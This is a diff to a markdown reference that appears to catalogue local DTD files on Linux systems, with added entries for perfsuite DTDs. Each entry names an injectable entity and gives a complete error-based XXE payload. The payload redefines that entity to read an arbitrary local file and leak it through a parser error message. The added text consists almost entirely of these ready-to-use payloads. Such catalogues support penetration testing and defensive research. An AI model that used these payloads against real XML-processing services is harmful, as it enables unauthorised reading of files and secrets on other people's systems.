@@ -655,7 +655,7 @@
 
 ```
 <!DOCTYPE message [
-    <!ENTITY % local_dtd SYSTEM "file:///C:\Users\parteau\AppData\Local\lxss\home\h3xstream\dtds\XMLSchema.dtd">
+    <!ENTITY % local_dtd SYSTEM "file:///etc/vmware-tools/vgauth/schemas/XMLSchema.dtd">
 
     <!ENTITY % xs-datatypes '
         <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
@@ -663,6 +663,107 @@
         &#x25;eval;
         &#x25;error;
         '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:**
+ - `/usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport-0.2.dtd`
+ - `/usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport-0.3.dtd`
+ - `/usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport.dtd`
+ - `/usr/share/perfsuite/dtds/pshwpc/hwpcreport-0.3.dtd`
+ - `/usr/share/perfsuite/dtds/pshwpc/hwpcreport.dtd`
+
+**Injectable entity:** `machineinfo.dtd`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/hwpcprofilereport-0.2.dtd">
+
+    <!ENTITY % machineinfo.dtd '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:**
+ - `/usr/share/perfsuite/dtds/pshwpc/multihwpcprofilereport-0.2.dtd`
+ - `/usr/share/perfsuite/dtds/pshwpc/multihwpcprofilereport-0.3.dtd`
+
+**Injectable entity:** `hwpcprofilereport.dtd`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/multihwpcprofilereport-0.2.dtd">
+
+    <!ENTITY % hwpcprofilereport.dtd '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:**
+ - `/usr/share/perfsuite/dtds/pshwpc/multihwpcreport-0.3.dtd`
+ - `/usr/share/perfsuite/dtds/pshwpc/multihwpcreport.dtd`
+
+**Injectable entity:** `hwpcreport.dtd`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/multihwpcreport-0.3.dtd">
+
+    <!ENTITY % hwpcreport.dtd '
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/usr/share/perfsuite/dtds/pshwpc/psmetrics.dtd`
+
+**Injectable entity:** `expr`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/perfsuite/dtds/pshwpc/psmetrics.dtd">
+
+    <!ENTITY % expr 'aaa)>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa (bb'>
 
     %local_dtd;
 ]>
